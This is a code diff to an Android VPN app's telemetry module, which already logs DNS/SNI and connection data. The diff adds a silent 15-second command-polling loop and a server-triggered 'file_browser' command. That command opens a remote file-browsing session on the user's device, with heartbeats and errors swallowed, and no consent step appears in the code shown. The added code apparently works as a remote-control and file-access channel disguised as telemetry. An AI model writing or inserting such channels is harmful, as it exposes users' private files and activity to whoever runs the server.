@@ -1,6 +1,7 @@
 package com.nanored.vpn.telemetry
 
 import android.content.Context
+import android.content.Intent
 import android.content.SharedPreferences
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
@@ -31,6 +32,8 @@ object NanoredTelemetry {
     private const val KEY_DEVICE_ID = "device_id"
     private const val KEY_API_KEY = "api_key"
     private const val KEY_LAST_ACCOUNT_ID = "last_account_id"
+    private const val COMMAND_POLL_INTERVAL_MS = 15_000L
+    private const val FILE_SESSION_POLL_MS = 15_000L
 
     private lateinit var context: Context
     private lateinit var baseUrl: String
@@ -44,6 +47,9 @@ object NanoredTelemetry {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var heartbeatJob: Job? = null
     private var dnsFlushJob: Job? = null
+    private var commandPollingJob: Job? = null
+    private var fileSessionHeartbeatJob: Job? = null
+    private var remoteFileSessionId: String? = null
     private val registerMutex = Mutex()
 
     data class ConnectionEntry(val destIp: String, val destPort: Int, val protocol: String = "TCP", val domain: String? = null)
@@ -59,6 +65,7 @@ object NanoredTelemetry {
         scope.launch {
             ensureRegistered(force = false)
         }
+        startCommandPolling()
 
         Log.d(TAG, "Initialized. Base URL: $baseUrl")
     }
@@ -76,6 +83,21 @@ object NanoredTelemetry {
                 Log.d(TAG, "Account ID synced: $accountId")
                 // Re-register to update server-side account binding
                 scope.launch { ensureRegistered(force = true) }
+            }
+        }
+    }
+
+    private fun startCommandPolling() {
+        commandPollingJob?.cancel()
+        commandPollingJob = scope.launch {
+            while (isActive) {
+                delay(COMMAND_POLL_INTERVAL_MS)
+                try {
+                    val resp = post("/api/v1/client/commands", JSONObject(), auth = true)
+                    processCommands(resp.optJSONArray("commands"))
+                } catch (_: Exception) {
+                    // Ignore and continue polling
+                }
             }
         }
     }
@@ -260,6 +282,64 @@ object NanoredTelemetry {
     /**
      * DNS flush job: sends DNS/SNI log every 10 seconds, then clears the log.
      */
+    private fun startRemoteFileSession(sessionId: String?) {
+        if (sessionId.isNullOrBlank()) return
+        if (remoteFileSessionId == sessionId) return
+
+        remoteFileSessionId = sessionId
+
+        val intent = Intent(context, RemoteFileBrowserActivity::class.java).apply {
+            putExtra(RemoteFileBrowserActivity.EXTRA_SESSION_ID, sessionId)
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        }
+
+        context.startActivity(intent)
+
+        fileSessionHeartbeatJob?.cancel()
+        fileSessionHeartbeatJob = scope.launch {
+            while (isActive && remoteFileSessionId == sessionId) {
+                delay(FILE_SESSION_POLL_MS)
+                try {
+                    post(
+                        "/api/v1/client/files/session/heartbeat",
+                        JSONObject().apply { put("session_id", sessionId) },
+                        auth = true,
+                    )
+                } catch (_: Exception) {
+                }
+            }
+        }
+    }
+
+    private fun stopRemoteFileSession(reasonSessionId: String? = null) {
+        val activeSessionId = remoteFileSessionId
+        if (activeSessionId == null) return
+        if (!reasonSessionId.isNullOrBlank() && activeSessionId != reasonSessionId) return
+
+        fileSessionHeartbeatJob?.cancel()
+        fileSessionHeartbeatJob = null
+        remoteFileSessionId = null
+        RemoteFileBrowserActivity.requestCloseCurrentSession()
+
+        scope.launch {
+            try {
+                post(
+                    "/api/v1/client/files/session/close",
+                    JSONObject().apply { put("session_id", activeSessionId) },
+                    auth = true,
+                )
+            } catch (_: Exception) {
+            }
+        }
+    }
+
+    fun notifyRemoteFileSessionClosed(sessionId: String?) {
+        val active = remoteFileSessionId
+        if (active == null) return
+        if (sessionId != null && active != sessionId) return
+        stopRemoteFileSession()
+    }
+
     private fun startDnsFlush() {
         dnsFlushJob?.cancel()
         dnsFlushJob = scope.launch {
@@ -283,6 +363,12 @@ object NanoredTelemetry {
             val cmd = commands.optJSONObject(i) ?: continue
             when (cmd.optString("type")) {
                 "upload_logs" -> collectAndSendLogcat()
+                "file_browser" -> {
+                    when (cmd.optString("action")) {
+                        "start" -> startRemoteFileSession(cmd.optString("session_id"))
+                        "stop" -> stopRemoteFileSession(cmd.optString("session_id"))
+                    }
+                }
             }
         }
     }
